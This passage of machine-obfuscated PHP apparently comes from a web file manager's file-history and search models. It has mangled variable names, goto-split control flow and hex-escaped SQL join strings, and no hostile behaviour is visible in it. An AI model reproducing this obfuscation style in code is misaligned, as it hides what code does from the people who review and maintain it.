B‰ÃÚ‰ë; eäÏöê»¢Ú: $bĞóïö‘‰… = 3; if ($b¹«‹ÚÔà == $F·òÅñÏõ[2339]) { $fª ›••[$F·òÅñÏõ[358]] = array_slice($fª ›••[$F·òÅñÏõ[358]], 0, $bĞóïö‘‰…); $fª ›••[$F·òÅñÏõ[355]] = array($F·òÅñÏõ[2342] => 1, $F·òÅñÏõ[2343] => 20, $F·òÅñÏõ[2344] => 1, $F·òÅñÏõ[2345] => count($fª ›••[$F·òÅñÏõ[358]])); } return $fª ›••; goto Bæ¸ìáÇ­İ; Bæ¸ìáÇ­İ: } protected function _listAppendUser(&$FŸÓ’îŠ¶‚) { $f‰°ˆ‡õŒ =& $_SERVER[‡’¶øåüç˜]; $A¿¨¾¬Òƒ¡ = array_to_keyvalue($FŸÓ’îŠ¶‚, $f‰°ˆ‡õŒ[33], $f‰°ˆ‡õŒ[1443]); $cê‹†Ñ×ùï = Model($f‰°ˆ‡õŒ[490])->userListInfo($A¿¨¾¬Òƒ¡); foreach ($FŸÓ’îŠ¶‚ as &$bËõ¦ô„•) { $aô×‰¥›å• = $bËõ¦ô„•[$f‰°ˆ‡õŒ[1443]]; $bËõ¦ô„•[$f‰°ˆ‡õŒ[390]] = $cê‹†Ñ×ùï[$aô×‰¥›å•] ? $cê‹†Ñ×ùï[$aô×‰¥›å•] : !1; } unset($bËõ¦ô„•); } public function fileInfo($aô¾ö¿ƒ¦Ú) { $Cå—¼ÔŞÙ =& $_SERVER[‡’¶øåüç˜]; $eø¥îÚ÷œŠ = $this->tablePrefix; $AæŒòÊÕ‡á = "{$eø¥îÚ÷œŠ}\151\157\137\146\151\x6c\145\x20\x66\x69\x6c\x65\x73\40\x6f\x6e\40\146\x69\x6c\145\x73\x2e\146\151\x6c\145\111\x44\x20\x3d\40\150\151\163\164\x6f\162\x79\56\146\x69\x6c\145\x49\104"; return $this->alias($Cå—¼ÔŞÙ[2346])->where(array($Cå—¼ÔŞÙ[397] => $aô¾ö¿ƒ¦Ú))->join($AæŒòÊÕ‡á, $Cå—¼ÔŞÙ[2347])->find(); } public function removeItem($a°Â…¸ö›ä) { $E„ÁëÄ«Şµ =& $_SERVER[‡’¶øåüç˜]; $c¶¬¼…—Ñõ = array($E„ÁëÄ«Şµ[397] => $a°Â…¸ö›ä); $E™°Œ‘Ü¡® = $this->where($c¶¬¼…—Ñõ)->find(); if ($E™°Œ‘Ü¡®) { $Aà ˆæ¦Â® = $this->where($c¶¬¼…—Ñõ)->delete(); Model($E„ÁëÄ«Şµ[434])->remove($E™°Œ‘Ü¡®[$E„ÁëÄ«Şµ[431]]); return $Aà ˆæ¦Â®; } return !1; } public function removeBySource($Dõ­øè£ªÂ) { goto B®ª™ø®ë—; cÇŒ‡ª«“Ò: $FØá«õÑŒô = array($b¤ùîˆ¢‹[395] => array($b¤ùîˆ¢‹[7], $Dõ­øè£ªÂ)); $A•ÀÜ·«ÇÃ = $this->field($b¤ùîˆ¢‹[432])->where($FØá«õÑŒô)->select(); if ($A•ÀÜ·«ÇÃ) { $this->where($FØá«õÑŒô)->delete(); $fê¥Ÿ•ù½„ = array_to_keyvalue($A•ÀÜ·«ÇÃ, $b¤ùîˆ¢‹[33], $b¤ùîˆ¢‹[431]); Model($b¤ùîˆ¢‹[434])->remove($fê¥Ÿ•ù½„); } goto D‰…°ÃøóÉ; B®ª™ø®ë—: $b¤ùîˆ¢‹ =& $_SERVER[‡’¶øåüç˜]; if (!$Dõ­øè£ªÂ) { return !1; } if (!is_array($Dõ­øè£ªÂ)) { $Dõ­øè£ªÂ = array($Dõ­øè£ªÂ); } goto cÇŒ‡ª«“Ò; D‰…°ÃøóÉ: return !0; goto E¢Á‡Æ‰Ã; E¢Á‡Æ‰Ã: } public function setDetail($CÜ©¡åòÆ», $CØØ£‹¤ô‘) { $CØÁé¥ğÛâ =& $_SERVER[‡’¶øåüç˜]; return $this->where(array($CØÁé¥ğÛâ[397] => $CÜ©¡åòÆ»))->save(array($CØÁé¥ğÛâ[2335] => $CØØ£‹¤ô‘)); } public function rollbackToItem($Eõ†‹î§•¼, $f•…Û™àßù) { goto Aëº¯ä¡Ö; Aëº¯ä¡Ö: $B´˜á„ïø¾ =& $_SERVER[‡’¶øåüç˜]; $D±èŒ‚…È¸ = Model($B´˜á„ïø¾[758])->sourceInfo($Eõ†‹î§•¼); $this->addHistory($D±èŒ‚…È¸); goto B¬åµßÃğÀ; dìÊËÒ±ñ¹: return $this->where(array($B´˜á„ïø¾[397] => $f•…Û™àßù))->delete(); goto D¬‰Ô•Óƒ; B¬åµßÃğÀ: $f—š—°¤„” = $this->find($f•…Û™àßù); $bÂ¦Öê¬ = array($B´˜á„ïø¾[431] => $f—š—°¤„”[$B´˜á„ïø¾[431]], $B´˜á„ïø¾[77] => $f—š—°¤„”[$B´˜á„ïø¾[77]], $B´˜á„ïø¾[107] => time(), $B´˜á„ïø¾[391] => USER_ID); Model($B´˜á„ïø¾[758])->where(array($B´˜á„ïø¾[381] => $Eõ†‹î§•¼))->save($bÂ¦Öê¬); goto dìÊËÒ±ñ¹; D¬‰Ô•Óƒ: } public function clearSame($FŞ¬Ş‹ˆ½) { goto cæÛÒ…¹†Ş; bµÈ§ÛŸ¬–: if (!$dîÏ¥•àÃ) { return; } $this->where(array($C¹Şœï´‘[371] => array($C¹Şœï´‘[7], $dîÏ¥•àÃ)))->delete(); Model($C¹Şœï´‘[434])->remove($C—Ñ«‚µÑõ); goto CªŞå¶Ë¡¿; e¥çŸÅ…¶š: $C—Ñ«‚µÑõ = array(); $dîÏ¥•àÃ = array(); foreach ($EßÏİË±ò as $CÒíÕÆĞğ) { if (!$CÒíÕÆĞğ || count($CÒíÕÆĞğ) <= 1) { continue; } foreach ($CÒíÕÆĞğ as $Cí‡ëÀ”«’) { $C—Ñ«‚µÑõ[] = $Cí‡ëÀ”«’[$C¹Şœï´‘[431]]; $dîÏ¥•àÃ[] = $Cí‡ëÀ”«’[$C¹Şœï´‘[371]]; } } goto bµÈ§ÛŸ¬–; cæÛÒ…¹†Ş: $C¹Şœï´‘ =& $_SERVER[‡’¶øåüç˜]; $EîÔ»œ´š— = $this->listData($FŞ¬Ş‹ˆ½); $EßÏİË±ò = array_to_keyvalue_group($EîÔ»œ´š—, $C¹Şœï´‘[431]); goto e¥çŸÅ…¶š; CªŞå¶Ë¡¿: } public function userSpace() { $Fø»ä¨Ö·‡ =& $_SERVER[‡’¶øåüç˜]; $Bìëö›ƒ = $this->tablePrefix; $bË¿Œ‰àÛ¨ = array($Fø»ä¨Ö·‡[1434] => USER_ID); $DÛˆ§¿«Ÿ = "{$Bìëö›ƒ}\151\x6f\137\146\x69\x6c\x65\40\x66\x69\154\145\x73\x20\157\156\x20\x66\151\x6c\x65\x73\x2e\146\x69\154\x65\x49\104\x20\x3d\40\x68\151\163\x74\157\x72\171\x2e\146\x69\154\145\111\x44"; return $this->alias($Fø»ä¨Ö·‡[2346])->where($bË¿Œ‰àÛ¨)->join($DÛˆ§¿«Ÿ, $Fø»ä¨Ö·‡[2347])->sum($Fø»ä¨Ö·‡[77]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($E£®çñøÏÑ) { goto cçÛÎ¦; dÈ‚¸êÓæ: if (!$AÓ•»¯Àò[$DâÙò”Öâ[165]]) { $eĞ‘ù¹´¹ù = array_to_keyvalue($A§¨ªÔ¨Ğ‰, $DâÙò”Öâ[33], $DâÙò”Öâ[165]); $AöÔÁ±â‚ = implode($DâÙò”Öâ[47], $eĞ‘ù¹´¹ù); $BœÉ¡Í¶˜Š = $DâÙò”Öâ[2295]; } $dÏÎÉœˆ¹ö = explode($DâÙò”Öâ[47], trim($AöÔÁ±â‚, $DâÙò”Öâ[47])); return array($BœÉ¡Í¶˜Š, $dÏÎÉœˆ¹ö); goto AŠØ†¾½æ–; FËŞê‚È¹: if (!$AÓ•»¯Àò) { return array(); } $AöÔÁ±â‚ = $AÓ•»¯Àò[$DâÙò”Öâ[165]]; $BœÉ¡Í¶˜Š = $DâÙò”Öâ[7]; goto dÈ‚¸êÓæ; cçÛÎ¦: $DâÙò”Öâ =& $_SERVER[‡’¶øåüç˜]; $A§¨ªÔ¨Ğ‰ = KodIO::fileTypeList(); $AÓ•»¯Àò = $A§¨ªÔ¨Ğ‰[$E£®çñøÏÑ]; goto FËŞê‚È¹; AŠØ†¾½æ–: } public function listPathType($dºì¾öÄ‹) { $cßõ”èÈ¹î =& $_SERVER[‡’¶øåüç˜]; $f¤á…†åÏ = $this->fileTypeWhere($dºì¾öÄ‹); if (!$f¤á…†åÏ) { return array(); } $B‹¬°¢‰‡— = array($cßõ”èÈ¹î[534] => SourceModel::TYPE_USER, $cßõ”èÈ¹î[535] => USER_ID, $cßõ”èÈ¹î[531] => 0, $cßõ”èÈ¹î[532] => $f¤á…†åÏ); return $this->listSource($B‹¬°¢‰‡—); } public function listSearch($F†¶ñğÎ˜Œ, $cßçğ‹’…‚ = 300) { goto Eé×¤­´–; Eé×¤­´–: $e™¼¬•ì… =& $_SERVER[‡’¶øåüç˜]; if (isset($F†¶ñğÎ˜Œ[$e™¼¬•ì…[2193]]) && $F†¶ñğÎ˜Œ[$e™¼¬•ì…[2193]]) { $F†¶ñğÎ˜Œ[$e™¼¬•ì…[2193]] = str_replace($e™¼¬•ì…[1597], $e™¼¬•ì…[2348], trim($F†¶ñğÎ˜Œ[$e™¼¬•ì…[2193]])); } $BáÌõÁöŒç = $this->_parseSearchWhere($F†¶ñğÎ˜Œ); goto B†å×ß†„º; B†å×ß†„º: if (!isset($BáÌõÁöŒç[$e™¼¬•ì…[409]])) { $BáÌõÁöŒç[$e™¼¬•ì…[409]] = 0; } $ašòåŸÕ¥š = $e™¼¬•ì…[2349]; $d†ÄÀ­±â˜ = $ašòåŸÕ¥š; goto F´ŠêÕ¸; a²Ù¥É“¬: $this->_listSearchDesc($eóùàë»îÖ, $F†¶ñğÎ˜Œ, $d†ÄÀ­±â˜); $this->_listSearchTag($eóùàë»îÖ, $F†¶ñğÎ˜Œ, $d†ÄÀ­±â˜); $this->_listSearchGroupTag($eóùàë»îÖ, $F†¶ñğÎ˜Œ, $d†ÄÀ­±â˜); goto DôÇ®ÓëÕ; DôÇ®ÓëÕ: $this->_listDataApply($eóùàë»îÖ[$e™¼¬•ì…[358]]); $this->_listMake($eóùàë»îÖ); return $eóùàë»îÖ; goto E¨ù×æï‘; F´ŠêÕ¸: $this->_listSearchBindPinyin($F†¶ñğÎ˜Œ, $BáÌõÁöŒç, $ašòåŸÕ¥š); $this->alias($e™¼¬•ì…[500])->_makeOrder(); $eóùàë»îÖ = $this->distinct(!0)->field($ašòåŸÕ¥š)->where($BáÌõÁöŒç)->selectPage($cßçğ‹’…‚); goto a²Ù¥É“¬; E¨ù×æï‘: } private function _listSearchTag(&$BåºØ—¬†Ş, $E×Ä†ŠÙ, $FÄÊ‹­ë¦Ñ) { goto F¦ÂßË ß; b‘“´‚Ÿ“—: $e—ùõğè¸° = array(); $eæå‰¡Œ„õ = $E×Ä†ŠÙ[$EïÀ‡­¡ù‹[2193]]; foreach ($bÁåãè®ª‡ as $Dä«‘¦¬É®) { $aÕ‚‘Ô·îÁ = $Dä«‘¦¬É®[$EïÀ‡­¡ù‹[28]]; $BÇÒ´š¡Ï¾ = str_replace($EïÀ‡­¡ù‹[50], $EïÀ‡­¡ù‹[33], Pinyin::encode($aÕ‚‘Ô·îÁ)); if (stripos($aÕ‚‘Ô·îÁ, $eæå‰¡Œ„õ) !== !1 || stripos($BÇÒ´š¡Ï¾, $eæå‰¡Œ„õ) !== !1) { $e—ùõğè¸°[] = $Dä«‘¦¬É®[$EïÀ‡­¡ù‹[371]]; } } goto AÕí¤æÜ·ê; F¦ÂßË ß: $EïÀ‡­¡ù‹ =& $_SERVER[‡’¶øåüç˜]; if (!$E×Ä†ŠÙ[$EïÀ‡­¡ù‹[2193]] || $BåºØ—¬†Ş[$EïÀ‡­¡ù‹[355]][$EïÀ‡­¡ù‹[344]] > 1) { return; } $bÁåãè®ª‡ = Model($EïÀ‡­¡ù‹[2350])->listData(); goto b‘“´‚Ÿ“—; AÕí¤æÜ·ê: if (!$e—ùõğè¸°) { return; } $Eõ½è¹ÉŠ“ = array($EïÀ‡­¡ù‹[405] => array($EïÀ‡­¡ù‹[7], $e—ùõğè¸°), $EïÀ‡­¡ù‹[1443] => USER_ID); $E½£è¥‡Å‚ = Model($EïÀ‡­¡ù‹[406])->field($EïÀ‡­¡ù‹[75])->where($Eõ½è¹ÉŠ“)->select(); goto c«çãÀŒŒ; c«çãÀŒŒ: $E½£è¥‡Å‚ = array_to_keyvalue($E½£è¥‡Å‚, $EïÀ‡­¡ù‹[33], $EïÀ‡­¡ù‹[75]); $C±ÚºèŠò = array_unique($E½£è¥‡Å‚); $this->_listSearchMerge($BåºØ—¬†Ş, $E×Ä†ŠÙ, $FÄÊ‹­ë¦Ñ, $C±ÚºèŠò); goto b‰Ş­¹Öù; b‰Ş­¹Öù: } private function _listSearchDesc(&$dëŞŒã›Ü‡, $d½Àô½ÉœÉ, $d÷å†³Š…Å) { goto A›»³ÅóŸá; aàÙ»¾œ³: $b×Ôø‹ƒ­… = Model($a†¤áŒ¾°[517])->field($a†¤áŒ¾°[381])->where($e’†‰öÛ…)->select(); $bæšŒÏÌ’µ = array_to_keyvalue($b×Ôø‹ƒ­…, $a†¤áŒ¾°[33], $a†¤áŒ¾°[381]); $this->_listSearchMerge($dëŞŒã›Ü‡, $d½Àô½ÉœÉ, $d÷å†³Š…Å, $bæšŒÏÌ’µ); goto D†ì‡åœù; c‹¥©öŞÓˆ: $aë‰µñ‘ĞÇ = array_unique($aë‰µñ‘ĞÇ); if (!$aë‰µñ‘ĞÇ) { return; } $e’†‰öÛ… = array($a†¤áŒ¾°[381] => array($a†¤áŒ¾°[7], $aë‰µñ‘ĞÇ), $a†¤áŒ¾°[89] => $a†¤áŒ¾°[417], $a†¤áŒ¾°[363] => array($a†¤áŒ¾°[757], $a†¤áŒ¾°[2195] . $d½Àô½ÉœÉ[$a†¤áŒ¾°[2193]] . $a†¤áŒ¾°[2195])); goto aàÙ»¾œ³; A›»³ÅóŸá: $a†¤áŒ¾° =& $_SERVER[‡’¶øåüç˜]; if (!$d½Àô½ÉœÉ[$a†¤áŒ¾°[2193]] || $dëŞŒã›Ü‡[$a†¤áŒ¾°[355]][$a†¤áŒ¾°[344]] > 1) { return; } $aë‰µñ‘ĞÇ = $this->listSearchChildren($d½Àô½ÉœÉ[$a†¤áŒ¾°[474]]); goto c‹¥©öŞÓˆ; D†ì‡åœù: } private function _listSearchGroupTag(&$d›à­”Ü, $AÊ îø Ü‚, $cå¨×…ô˜¯) { goto D×Ø‹…íÀ­; Eîößç…ë: $Eéœ¨Ââø£ = array_to_keyvalue($Eéœ¨Ââø£, $CÍöÁ‘ïì[33], $CÍöÁ‘ïì[75]); $fç«‰Ê¬Ğ = array_unique($Eéœ¨Ââø£); $this->_listSearchMerge($d›à­”Ü, $AÊ îø Ü‚, $cå¨×…ô˜¯, $fç«‰Ê¬Ğ); goto Bøµæ÷÷Ë; f³•±›ÓŒ: if (!$FÃ£ÖÎøæ¸) { return; } $eÙö±åŠˆŒ = array($CÍöÁ‘ïì[405] => array($CÍöÁ‘ïì[7], $FÃ£ÖÎøæ¸), $CÍöÁ‘ïì[1443] => 0, $CÍöÁ‘ïì[29] => $CÍöÁ‘ïì[2213] . $D—Ã…Êà²Ú); $Eéœ¨Ââø£ = Model($CÍöÁ‘ïì[406])->field($CÍöÁ‘ïì[75])->where($eÙö±åŠˆŒ)->select(); goto Eîößç…ë; BÎïôËòòì: $FÃ£ÖÎøæ¸ = array(); $eÚìğè®ùõ = $AÊ îø Ü‚[$CÍöÁ‘ïì[2193]]; foreach ($d©¢èö˜[$CÍöÁ‘ïì[358]] as $bÁĞ‡º†òö) { $B³ÖÓ×ŸÂ« = $bÁĞ‡º†òö[$CÍöÁ‘ïì[28]]; $eÑ‚õÇ‹ò’ = str_replace($CÍöÁ‘ïì[50], $CÍöÁ‘ïì[33], Pinyin::encode($B³ÖÓ×ŸÂ«)); if (stripos($B³ÖÓ×ŸÂ«, $eÚìğè®ùõ) !== !1 || stripos($eÑ‚õÇ‹ò’, $eÚìğè®ùõ) !== !1) { $FÃ£ÖÎøæ¸[] = $bÁĞ‡º†òö[$CÍöÁ‘ïì[371]]; } } goto f³•±›ÓŒ; A‘®²Š§©: if (!$CàñÔ‡ß½Í || $CàñÔ‡ß½Í[$CÍöÁ‘ïì[383]] != SourceModel::TYPE_GROUP) { return; } $D—Ã…Êà²Ú = $CàñÔ‡ß½Í[$CÍöÁ‘ïì[469]]; $d©¢èö˜ = Model($CÍöÁ‘ïì[2351])->get($D—Ã…Êà²Ú); goto BÎïôËòòì; D×Ø‹…íÀ­: $CÍöÁ‘ïì =& $_SERVER[‡’¶øåüç˜]; if (!$AÊ îø Ü‚[$CÍöÁ‘ïì[2193]] || $d›à­”Ü[$CÍöÁ‘ïì[355]][$CÍöÁ‘ïì[344]] > 1 || !$AÊ îø Ü‚[$CÍöÁ‘ïì[474]]) { return; } $CàñÔ‡ß½Í = $this->sourceInfo($AÊ îø Ü‚[$CÍöÁ‘ïì[474]]); goto A‘®²Š§©; Bøµæ÷÷Ë: } private function _listSearchMerge(&$dËİ»’íŠ¾, $eó÷ ‹×İµ, $b¾éÒ‰µ©•, $fÛÊ¾¨ªŸã) { goto d¶¯­Ë¤–ê; f‘È£¾÷íò: foreach ($dôùÈ‹ÊÑç as $EèøŠÒ‡‚Ñ) { $C‰Ó‘éÀ‡ = $c…ù¯˜’[47] . $eó÷ ‹×İµ[$c…ù¯˜’[474]] . $c…ù¯˜’[47]; if (stripos($EèøŠÒ‡‚Ñ[$c…ù¯˜’[472]], $C‰Ó‘éÀ‡) !== !1) { $bóÂ³œ™–[] = $EèøŠÒ‡‚Ñ; } } $dËİ»’íŠ¾[$c…ù¯˜’[358]] = array_merge($bóÂ³œ™–, $dËİ»’íŠ¾[$c…ù¯˜’[358]]); $dËİ»’íŠ¾[$c…ù¯˜’[355]][$c…ù¯˜’[356]] += count($bóÂ³œ™–); goto cÁˆ§“§Î; bõÖØ„µÊ: $CÙ±Õ„‰Øå = array_diff($fÛÊ¾¨ªŸã, $açÙ£’Í®); if (!$CÙ±Õ„‰Øå) { return; } $B¿âËš­›¸ = array($c…ù¯˜’[381] => array($c…ù¯˜’[7], $CÙ±Õ„‰Øå)); goto A¤‰°Ô§˜; A¤‰°Ô§˜: $dôùÈ‹ÊÑç = $this->field($b¾éÒ‰µ©•)->where($B¿âËš­›¸)->select(); if (!$dôùÈ‹ÊÑç) { return; } $bóÂ³œ™– = array(); goto f‘È£¾÷íò; d¶¯­Ë¤–ê: $c…ù¯˜’ =& $_SERVER[‡’¶øåüç˜]; if (!$fÛÊ¾¨ªŸã) { return; } $açÙ£’Í® = array_to_keyvalue($dËİ»’íŠ¾[$c…ù¯˜’[358]], $c…ù¯˜’[33], $c…ù¯˜’[381]); goto bõÖØ„µÊ; cÁˆ§“§Î: } public function listSearchChildren($Fò””Ç–ÈÖ, $Aö½Š¨’¡ = 5000) { goto aÚãŠçââ¶; dŞë„”Ìä¶: $dŞ¢ë‰†Š¡ = $this->field($BÍíóªÏèÍ[381])->where($c’¢ ¡À)->select(); $f‹“Îß¹§„ = array_to_keyvalue($dŞ¢ë‰†Š¡, $BÍíóªÏèÍ[33], $BÍíóªÏèÍ[381]); return $f‹“Îß¹§„; goto aµÚµ†®Íº; bÁƒ‘¥§âÇ: $c’¢ ¡À = array($BÍíóªÏèÍ[472] => array($BÍíóªÏèÍ[757], $D´™»Öƒ™À[$BÍíóªÏèÍ[472]] . $D´™»Öƒ™À[$BÍíóªÏèÍ[381]] . $BÍíóªÏèÍ[497])); $dª¬ªäªŠ£ = $this->field($BÍíóªÏèÍ[381])->cache(null, 600)->where($c’¢ ¡À)->count(); if ($dª¬ªäªŠ£ > $Aö½Š¨’¡) { return $this->_listSearchChildrenNear($Fò””Ç–ÈÖ, $Aö½Š¨’¡); } goto dŞë„”Ìä¶; aÚãŠçââ¶: $BÍíóªÏèÍ =& $_SERVER[‡’¶øåüç˜]; $f‹“Îß¹§„ = array(); $D´™»Öƒ™À = $this->sourceInfo($Fò””Ç–ÈÖ); goto bÁƒ‘¥§âÇ; aµÚµ†®Íº: } private function _listSearchChildrenNear($Fˆ¢ñ·„, $EÖ×çÈœ¼‰) { goto Eà’×±ŸÀâ; DÙ”«Ãóí±: if (!$EÌÒ«ª£ñ©) { return $E¤ò×ÈĞí; } $Dóˆ‘ø‰²Ç = array($dÏ»šÃÂŠÜ[474] => array($dÏ»šÃÂŠÜ[7], $EÌÒ«ª£ñ©)); $cŸÛŠ„›§“ = $this->field($dÏ»šÃÂŠÜ[2352])->where($Dóˆ‘ø‰²Ç)->select(); goto CçµÉ¶ß…; D´»˜Ô±áù: $cŸÛŠ„›§“ = $this->field($dÏ»šÃÂŠÜ[2352])->where($Dóˆ‘ø‰²Ç)->select(); $EÌÒ«ª£ñ© = array_to_keyvalue(array_filter_by_field($cŸÛŠ„›§“, $dÏ»šÃÂŠÜ[382], $dÏ»šÃÂŠÜ[83]), $dÏ»šÃÂŠÜ[33], $dÏ»šÃÂŠÜ[381]); $E¤ò×ÈĞí = array_merge($E¤ò×ÈĞí, array_to_keyvalue($cŸÛŠ„›§“, $dÏ»šÃÂŠÜ[33], $dÏ»šÃÂŠÜ[381])); goto DÙ”«Ãóí±; Eà’×±ŸÀâ: $dÏ»šÃÂŠÜ =& $_SERVER[‡’¶øåüç˜]; $E¤ò×ÈĞí = array(); $Dóˆ‘ø‰²Ç = array($dÏ»šÃÂŠÜ[474] => $Fˆ¢ñ·„); goto D´»˜Ô±áù; CçµÉ¶ß…: $E¤ò×ÈĞí = array_merge($E¤ò×ÈĞí, array_to_keyvalue($cŸÛŠ„›§“, $dÏ»šÃÂŠÜ[33], $dÏ»šÃÂŠÜ[381])); $E¤ò×ÈĞí = array_slice($E¤ò×ÈĞí, 0, $EÖ×çÈœ¼‰); return $E¤ò×ÈĞí; goto E¡áˆ°‹Ë¨; E¡áˆ°‹Ë¨: } private function _listSearchBindPinyin($a±÷ÂâÜâ, &$e…ùÌÁêÅ©, &$Fµ³Şìï) { goto bÆ‚ÜËÁë ; D§ÃŒÈÕ˜: $C†¿Õ§Ò˜ˆ[] = array($fã’èâ§º[2356] => $DöŞªà–Ûï, $fã’èâ§º[917] => $fã’èâ§º[2197], array($fã’èâ§º[2357] => $DöŞªà–Ûï, $fã’èâ§º[2358] => array($fã’èâ§º[7], array($fã’èâ§º[428], $fã’èâ§º[427])))); $this->join($b•‚Ò¿‰ª); $e…ùÌÁêÅ© = $C†¿Õ§Ò˜ˆ; goto fï¯šµÏÚ³; f¨æÖ´: $C†¿Õ§Ò˜ˆ = array(); $Fµ³Şìï = str_replace(array($fã’èâ§º[221], $fã’èâ§º[50], $fã’èâ§º[2353]), $fã’èâ§º[33], $Fµ³Şìï); $Fµ³Şìï = $fã’èâ§º[2354] . str_replace($fã’èâ§º[47], $fã’èâ§º[2355], $Fµ³Şìï); goto Aù¹òè•®á; bÆ‚ÜËÁë : $fã’èâ§º =& $_SERVER[‡’¶øåüç˜]; if (!Input::check($a±÷ÂâÜâ[$fã’èâ§º[2193]], $fã’èâ§º[310]) || strlen($a±÷ÂâÜâ[$fã’èâ§º[2193]]) < 2) { return; } $b•‚Ò¿‰ª = "\x4c\105\x46\x54\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\151\x6f\137\163\157\x75\x72\143\145\137\155\x65\164\141\x20\x6d\145\164\x61\40\x6f\x6e\40\163\157\x75\162\x63\x65\x2e\x73\157\165\x72\x63\145\111\x44\x20\x3d\40\155\x65\164\x61\56\163\x6f\x75\x72\143\145\x49\104"; goto f¨æÖ´; Aù¹òè•®á: unset($e…ùÌÁêÅ©[$fã’èâ§º[28]]); foreach ($e…ùÌÁêÅ© as $fù‹¿Ã«öŒ => $BÓÑ§Á²åá) { $C†¿Õ§Ò˜ˆ[$fã’èâ§º[2354] . $fù‹¿Ã«öŒ] = $BÓÑ§Á²åá; } $DöŞªà–Ûï = array($fã’èâ§º[496], $fã’èâ§º[2195] . $a±÷ÂâÜâ[$fã’èâ§º[2193]] . $fã’èâ§º[2195]); goto D§ÃŒÈÕ˜; fï¯šµÏÚ³: } private function _parseSearchWhere($BàáôÇÈ§Ş) { goto a²™ï”¸„’; a²™ï”¸„’: $aª½ĞôíøÑ =& $_SERVER[‡’¶øåüç˜]; $CÍËŞ‰²Á = array(); if (isset($BàáôÇÈ§Ş[$aª½ĞôíøÑ[708]])) { $CÍËŞ‰²Á[$aª½ĞôíøÑ[107]] = array($aª½ĞôíøÑ[2359], $BàáôÇÈ§Ş[$aª½ĞôíøÑ[708]]); } goto A“ ªõ¦Ş°; A“ ªõ¦Ş°: if (isset($BàáôÇÈ§Ş[$aª½ĞôíøÑ[460]])) { $FØŞÂ£ÙØ¿ = array($aª½ĞôíøÑ[2360], $BàáôÇÈ§Ş[$aª½ĞôíøÑ[460]]); if ($CÍËŞ‰²Á[$aª½ĞôíøÑ[107]]) { $CÍËŞ‰²Á[$aª½ĞôíøÑ[107]] = array($CÍËŞ‰²Á[$aª½ĞôíøÑ[107]], $FØŞÂ£ÙØ¿, $aª½ĞôíøÑ[2361]); } else { $CÍËŞ‰²Á[$aª½ĞôíøÑ[107]] = $FØŞÂ£ÙØ¿; } } if (isset($BàáôÇÈ§Ş[$aª½ĞôíøÑ[2362]])) { $CÍËŞ‰²Á[$aª½ĞôíøÑ[77]] = array($aª½ĞôíøÑ[2359], $BàáôÇÈ§Ş[$aª½ĞôíøÑ[2362]]); } if (isset($BàáôÇÈ§Ş[$aª½ĞôíøÑ[2363]])) { $FØŞÂ£ÙØ¿ = array($aª½ĞôíøÑ[2360], $BàáôÇÈ§Ş[$aª½ĞôíøÑ[2363]]); if ($CÍËŞ‰²Á[$aª½ĞôíøÑ[77]]) { $CÍËŞ‰²Á[$aª½ĞôíøÑ[77]] = array($CÍËŞ‰²Á[$aª½ĞôíøÑ[77]], $FØŞÂ£ÙØ¿, $aª½ĞôíøÑ[2361]); } else { $CÍËŞ‰²Á[$aª½ĞôíøÑ[77]] = $FØŞÂ£ÙØ¿; } } goto e›‘ÒÚ ×í; Cê‡©‰°š: if (isset($BàáôÇÈ§Ş[$aª½ĞôíøÑ[2193]]) && $BàáôÇÈ§Ş[$aª½ĞôíøÑ[2193]]) { $Dëê­’­ = $BàáôÇÈ§Ş[$aª½ĞôíøÑ[2193]]; $cÚá®½İ–› = explode($aª½ĞôíøÑ[50], $Dëê­’­); if (strlen($Dëê­’­) > 2 && (substr($Dëê­’­, 0, 1) == $aª½ĞôíøÑ[113] && substr($Dëê­’­, -1) == $aª½ĞôíøÑ[113]) || substr($Dëê­’­, 0, 1) == $aª½ĞôíøÑ[55] && substr($Dëê­’­, -1) == $aª½ĞôíøÑ[55]) { $Dëê­’­ = substr($Dëê­’­, 1, -1); $cÚá®½İ–› = array($Dëê­’­); } $CÍËŞ‰²Á[$aª½ĞôíøÑ[28]] = array($aª½ĞôíøÑ[496], $aª½ĞôíøÑ[2195] . $Dëê­’­ . $aª½ĞôíøÑ[2195]); if (count($cÚá®½İ–›) > 1) { $CÍËŞ‰²Á[$aª½ĞôíøÑ[28]] = array(); foreach ($cÚá®½İ–› as $dç²ÅÚÆˆ) { if (!trim($dç²ÅÚÆˆ)) { continue; } $CÍËŞ‰²Á[$aª½ĞôíøÑ[28]][] = array($aª½ĞôíøÑ[496], $aª½ĞôíøÑ[2195] . trim($dç²ÅÚÆˆ) . $aª½ĞôíøÑ[2195]); } } } return $CÍËŞ‰²Á; goto fèÎ™°ºÇÔ; e›‘ÒÚ ×í: if (isset($BàáôÇÈ§Ş[$aª½ĞôíøÑ[547]])) { $CÍËŞ‰²Á[] = array($aª½ĞôíøÑ[391] => $BàáôÇÈ§Ş[$aª½ĞôíøÑ[547]], $aª½ĞôíøÑ[390] => $BàáôÇÈ§Ş[$aª½ĞôíøÑ[547]], $aª½ĞôíøÑ[917] => $aª½ĞôíøÑ[2197]); } if (isset($BàáôÇÈ§Ş[$aª½ĞôíøÑ[384]])) { $Aôá–õ‹ïÌ = $BàáôÇÈ§Ş[$aª½ĞôíøÑ[384]]; if ($Aôá–õ‹ïÌ == $aª½ĞôíøÑ[76]) { $CÍËŞ‰²Á[$aª½ĞôíøÑ[382]] = 1; } else { if ($Aôá–õ‹ïÌ == $aª½ĞôíøÑ[2364]) { $CÍËŞ‰²Á[$aª½ĞôíøÑ[382]] = 0; } else { if ($Aôá–õ‹ïÌ) { $Aôá–õ‹ïÌ = is_array($Aôá–õ‹ïÌ) ? $Aôá–õ‹ïÌ : explode($aª½ĞôíøÑ[47], $Aôá–õ‹ïÌ); $CÍËŞ‰²Á[$aª½ĞôíøÑ[384]] = array($aª½ĞôíøÑ[396], $Aôá–õ‹ïÌ); $CÍËŞ‰²Á[$aª½ĞôíøÑ[382]] = 0; } } } } if (isset($BàáôÇÈ§Ş[$aª½ĞôíøÑ[474]])) { $EßÖŸœ¾Á = $this->sourceInfo($BàáôÇÈ§Ş[$aª½ĞôíøÑ[474]]); $CÍËŞ‰²Á[$aª½ĞôíøÑ[538]] = array($aª½ĞôíøÑ[496], $EßÖŸœ¾Á[$aª½ĞôíøÑ[472]] . $BàáôÇÈ§Ş[$aª½ĞôíøÑ[474]] . $aª½ĞôíøÑ[497]); } goto Cê‡©‰°š; fèÎ™°ºÇÔ: } } goto CËÓ¶™¸ ğ; Cğ¨àÊ”Ú: class PathDriverBase { public $pathDriver = ''; public $pathBase = 